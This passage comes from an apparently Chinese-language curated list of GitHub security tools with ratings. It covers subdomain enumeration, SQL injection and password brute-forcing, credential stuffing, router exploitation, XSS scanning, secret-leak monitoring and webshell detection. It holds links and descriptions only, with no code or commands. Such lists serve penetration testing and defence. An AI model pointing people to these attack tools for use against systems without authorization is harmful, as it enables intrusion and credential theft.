href="https://github.com/UnaPibaGeek/ctfr">https://github.com/UnaPibaGeek/ctfr</a> - <strong>通过域名透明证书记录获取子域名</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/giovanifss/Dumb">https://github.com/giovanifss/Dumb</a> - <strong>灵活扩展的子域名爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Haskell</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/caffix/amass">https://github.com/caffix/amass</a> - <strong>Go语言开发的子域名枚举工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Ice3man543/subfinder">https://github.com/Ice3man543/subfinder</a> - <strong>继承于Sublist3r项目的模块化体系结构，一个强劲的子域名枚举工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Ice3man543/SubOver">https://github.com/Ice3man543/SubOver</a> - <strong>一款精准的子域名结构检测工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/janniskirschner/horn3t">https://github.com/janniskirschner/horn3t</a> - <strong>带有网页截图功能的子可视化域名枚举工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><h3 id="数据库注入漏洞或认证爆破"><a href="#数据库注入漏洞或认证爆破" class="headerlink" title="数据库注入漏洞或认证爆破"></a>数据库注入漏洞或认证爆破</h3><ul><li><a href="https://github.com/0xbug/SQLiScanner">https://github.com/0xbug/SQLiScanner</a> - <strong>一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/stamparm/DSSS">https://github.com/stamparm/DSSS</a> - <strong>99行代码实现的sql注入漏洞扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a>  - <strong>一款针对mongoDB的攻击工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Neohapsis/bbqsql">https://github.com/Neohapsis/bbqsql</a> - <strong>SQL盲注利用框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a> - <strong>攻击SQLSERVER的Powershell脚本框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Powershell</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/WhitewidowScanner/whitewidow">https://github.com/WhitewidowScanner/whitewidow</a> - <strong>一款数据库扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟         |         <strong>编程语言</strong>: <strong>Ruby</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/stampery/mongoaudit">https://github.com/stampery/mongoaudit</a> - <strong>MongoDB审计及渗透工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/torque59/Nosql-Exploitation-Framework">https://github.com/torque59/Nosql-Exploitation-Framework</a> - <strong>NoSQL扫描、爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/missDronio/blindy">https://github.com/missDronio/blindy</a> - <strong>MySQL盲注爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/fengxuangit/Fox-scan">https://github.com/fengxuangit/Fox-scan</a> - <strong>基于SQLMAP的主动和被动资源发现的漏洞扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/JohnTroony/Blisqy">https://github.com/JohnTroony/Blisqy</a> - <strong>用于http header中的时间盲注爆破工具，仅针对MySQL&#x2F;MariaDB</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a> - <strong>Java 编写的SQL注入工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Java</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Hadesy2k/sqliv">https://github.com/Hadesy2k/sqliv</a> - <strong>基于搜索引擎的批量SQL注入漏洞扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/s0md3v/sqlmate">https://github.com/s0md3v/sqlmate</a> - <strong>在SQLMAP基础上变SQLMAP得更加易用和便捷</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/m8r0wn/enumdb">https://github.com/m8r0wn/enumdb</a>  - <strong>MySQL以及MSSQL爆破脱裤工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><h3 id="网站弱用户名或弱口令枚举爆破"><a href="#网站弱用户名或弱口令枚举爆破" class="headerlink" title="网站弱用户名或弱口令枚举爆破"></a>网站弱用户名或弱口令枚举爆破</h3><ul><li><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a>  - <strong>一个简单的HTTP暴力破解、撞库攻击脚本</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/netxfly/crack_ssh">https://github.com/netxfly/crack_ssh</a> - <strong>Go写的协程版的SSH、Redis、mongoDB弱口令破解工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/shengqi158/weak_password_detect">https://github.com/shengqi158/weak_password_detect</a> - <strong>多线程探测弱口令</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/s0md3v/Blazy">https://github.com/s0md3v/Blazy</a> - <strong>支持测试 CSRF, Clickjacking, Cloudflare 和 WAF识别的弱口令探测器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/MooseDojo/myBFF">https://github.com/MooseDojo/myBFF</a> - <strong>对CiscoVPN、Citrix Gateway等各类服务进行弱口令检测的脚本</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/TideSec/web_pwd_common_crack">https://github.com/TideSec/web_pwd_common_crack</a> - <strong>一款通用的web弱口令破解脚本，可批量检测没有验证码的管理后台。</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><h3 id="物联网设备认证爆破或漏洞评估"><a href="#物联网设备认证爆破或漏洞评估" class="headerlink" title="物联网设备认证爆破或漏洞评估"></a>物联网设备认证爆破或漏洞评估</h3><ul><li><a href="https://github.com/rapid7/IoTSeeker">https://github.com/rapid7/IoTSeeker</a> - <strong>物联网设备默认密码扫描检测工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Perl</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/shodan-labs/iotdb">https://github.com/shodan-labs/iotdb</a> - <strong>使用nmap扫描IoT设备</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>XML</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/googleinurl/RouterHunterBR">https://github.com/googleinurl/RouterHunterBR</a> - <strong>路由器设备漏洞扫描利用</strong></li></ul><p><strong>评分</strong>: 🌟🌟         |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/scu-igroup/telnet-scanner">https://github.com/scu-igroup/telnet-scanner</a> - <strong>Telnet服务密码撞库</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/viraintel/OWASP-Nettacker">https://github.com/viraintel/OWASP-Nettacker</a> - <strong>自动化信息搜集及渗透测试工具，比较适用于IoT扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/threat9/routersploit">https://github.com/threat9/routersploit</a> - <strong>嵌入式设备漏洞扫描及利用工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/w3h/icsmaster/tree/master/nse">https://github.com/w3h/icsmaster/tree/master/nse</a> - <strong>数字化工控设备认证爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>NSE</strong>         |         <strong>仍在维护</strong>: ✖️</p><h3 id="多类型跨站脚本漏洞检测"><a href="#多类型跨站脚本漏洞检测" class="headerlink" title="多类型跨站脚本漏洞检测"></a>多类型跨站脚本漏洞检测</h3><ul><li><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a> - <strong>PHP版本的反射型XSS扫描</strong></li></ul><p><strong>Rating</strong>: 🌟🌟        |         <strong>Language</strong>: <strong>PHP</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✖️</p><ul><li><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a> - <strong>批量扫描XSS的Python脚本</strong></li></ul><p><strong>Rating</strong>: 🌟🌟🌟        |         <strong>Language</strong>: <strong>Python 2.x</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✖️</p><ul><li><a href="https://github.com/BlackHole1/autoFindXssAndCsrf">https://github.com/BlackHole1/autoFindXssAndCsrf</a> - <strong>自动化检测页面是否存在XSS和CSRF漏洞的浏览器插件</strong></li></ul><p><strong>Rating</strong>: 🌟🌟        |         <strong>Language</strong>: <strong>Javascript</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✖️</p><ul><li><a href="https://github.com/shogunlab/shuriken">https://github.com/shogunlab/shuriken</a> - <strong>使用命令行进行XSS批量检测</strong></li></ul><p><strong>Rating</strong>: 🌟🌟🌟        |         <strong>Language</strong>: <strong>Python 2.x</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✖️</p><ul><li><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a> - <strong>可识别并绕过WAF的XSS扫描工具</strong></li></ul><p><strong>Rating</strong>: 🌟🌟🌟🌟🌟        |         <strong>Language</strong>: <strong>Python 3.x</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✔️</p><ul><li><a href="https://github.com/stamparm/DSXS">https://github.com/stamparm/DSXS</a> - <strong>支持GET、POST方式的高效XSS扫描器</strong></li></ul><p><strong>Rating</strong>: 🌟🌟🌟🌟        |         <strong>Language</strong>: <strong>Python 3.x</strong>         |         <strong>Ongoing[last 6 months]</strong>: ✔️</p><h3 id="企业资产管理或数据保护"><a href="#企业资产管理或数据保护" class="headerlink" title="企业资产管理或数据保护"></a>企业资产管理或数据保护</h3><ul><li><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a> - <strong>网络资产识别引擎，漏洞检测引擎</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a> - <strong>Bing、Google、360、Zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Ekultek/Zeus-Scanner">https://github.com/Ekultek/Zeus-Scanner</a> - <strong>集成化的综合搜索引擎，能够抓取被搜索引擎隐藏的url,并交由sqlmap、nmap扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/0xbug/Biu-framework">https://github.com/0xbug/Biu-framework</a> - <strong>企业内网基础服务安全扫描框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a> - <strong>Github repos信息搜集工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/repoog/GitPrey">https://github.com/repoog/GitPrey</a> - <strong>GitHub敏感信息扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a> - <strong>企业资产、敏感信息GitHub泄露监控系统</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a> - <strong>Github敏感信息搜索工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x&#x2F;3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a> - <strong>GitHub敏感信息扫描工具,包括检测commit等</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/1N3/Goohak">https://github.com/1N3/Goohak</a> - <strong>自动化对指定域名进行Google hacking搜索并收集信息</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/UKHomeOffice/repo-security-scanner">https://github.com/UKHomeOffice/repo-security-scanner</a> - <strong>用于搜索git commit中的敏感信息，例如密码、私钥等的客户端工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a> - <strong>Github敏感信息泄露扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a> - <strong>Github泄露检测巡航工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/anshumanbh/git-all-secrets">https://github.com/anshumanbh/git-all-secrets</a> - <strong>集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Go</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a> - <strong>由vipkid SRC开发的Github信息泄漏监控系统</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><h3 id="恶意脚本或木马检测"><a href="#恶意脚本或木马检测" class="headerlink" title="恶意脚本或木马检测"></a>恶意脚本或木马检测</h3><ul><li><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a>  -<strong>一款简单的webshell检测工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Tencent/HaboMalHunter">https://github.com/Tencent/HaboMalHunter</a>  -<strong>哈勃分析系统，Linux系统病毒分析及安全检测</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/PlagueScanner/PlagueScanner">https://github.com/PlagueScanner/PlagueScanner</a> - <strong>使用python实现的集成ClamAV、ESET、Bitdefender的反病毒引擎</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/nbs-system/php-malware-finder">https://github.com/nbs-system/php-malware-finder</a> - <strong>一款高效率PHP-webshell扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a> - <strong>测试效率高达99%的webshell检测工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/erevus-cn/scan_webshell">https://github.com/erevus-cn/scan_webshell</a> - <strong>一款基础的基于正则的webshell扫描工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/emposha/Shell-Detector">https://github.com/emposha/Shell-Detector</a> - <strong>Webshell扫描工具，支持PHP&#x2F;Perl&#x2F;ASP&#x2F;ASPX webshell扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/m4rco-/dorothy2">https://github.com/m4rco-/dorothy2</a> - <strong>一款木马、僵尸网络分析框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Ruby</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/droidefense/engine">https://github.com/droidefense/engine</a> - <strong>高级安卓木马病毒分析框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Java</strong>         |         <strong>仍在维护</strong>: ✔️</p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><ul><li><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a> - <strong>基于网络流量的内网探测框架</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>语言</strong>: <strong>C++</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a> - <strong>调用 Windows API 枚举用户登录信息</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>语言</strong>: <strong>C++</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/BlackHole1/WebRtcXSS">https://github.com/BlackHole1/WebRtcXSS</a> - <strong>自动化利用XSS入侵内网</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>语言</strong>: <strong>PHP</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Tib3rius/AutoRecon">https://github.com/Tib3rius/AutoRecon</a> - <strong>多线程目标网段探测工具，适用于大型内网探测扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟🌟        |         <strong>语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><h3 id="中间件漏洞评估或信息泄露扫描"><a href="#中间件漏洞评估或信息泄露扫描" class="headerlink" title="中间件漏洞评估或信息泄露扫描"></a>中间件漏洞评估或信息泄露扫描</h3><ul><li><a href="https://github.com/ring04h/wyportmap">https://github.com/ring04h/wyportmap</a> - <strong>目标端口扫描、系统服务指纹识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a> - <strong>动态多线程敏感信息泄露检测工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a> - <strong>WAF产品指纹识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a> - <strong>SSL&#x2F;TLS服务安全评估</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>C</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a> - <strong>Web指纹识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Ruby</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a> - <strong>Web指纹识别工具，整合多个指纹库结合多种指纹检测方法，检测高效准确</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>        |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/TideSec/FuzzScanner">https://github.com/TideSec/FuzzScanner</a> - <strong>综合型web信息搜集平台，部署方便，功能多样且实用</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>        |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/tanjiti/FingerPrint">https://github.com/tanjiti/FingerPrint</a> - <strong>Web应用指纹识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Perl</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a> - <strong>网络爬虫式指纹识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/OffensivePython/Nscan">https://github.com/OffensivePython/Nscan</a> - <strong>基于Masscan和Zmap的网络扫描器</strong></li></ul><p><strong>评分</strong>: 🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/ywolf/F-NAScan">https://github.com/ywolf/F-NAScan</a> - <strong>网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a> - <strong>web路径收集与扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a> - <strong>C段Banner与路径扫描</strong></li></ul><p><strong>评分</strong>: 🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/RASSec/RASscan">https://github.com/RASSec/RASscan</a> - <strong>端口服务扫描</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a> - <strong>waf自动暴破绕过</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a> - <strong>尝试找出cdn背后的真实ip</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 3.x</strong>         |         <strong>仍在维护</strong>: ✔️</p><ul><li><a href="https://github.com/Xyntax/BingC">https://github.com/Xyntax/BingC</a> - <strong>基于Bing搜索引擎的C段、旁站查询，多线程，支持API</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Xyntax/DirBrute">https://github.com/Xyntax/DirBrute</a> - <strong>多线程WEB目录爆破工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/zer0h/httpscan">https://github.com/zer0h/httpscan</a> - <strong>一个爬虫式的网段Web主机发现小工具</strong></li></ul><p><strong>评分</strong>: 🌟🌟        |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/lietdai/doom">https://github.com/lietdai/doom</a>  - <strong>Thorn上实现的分布式任务分发的ip端口漏洞扫描器</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/chichou/grab.js">https://github.com/chichou/grab.js</a>  - <strong>类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Node.js</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/Nitr4x/whichCDN">https://github.com/Nitr4x/whichCDN</a> - <strong>CDN识别、检测</strong></li></ul><p><strong>评分</strong>: 🌟🌟🌟🌟         |         <strong>编程语言</strong>: <strong>Python 2.x</strong>         |         <strong>仍在维护</strong>: ✖️</p><ul><li><a href="https://github.com/secfree/bcrpscan">https://github.com/secfree/bcrpscan</a> - <strong>基于爬虫的web路径扫描器</strong></li></ul><p><strong>评分</strong>: 🌟         |         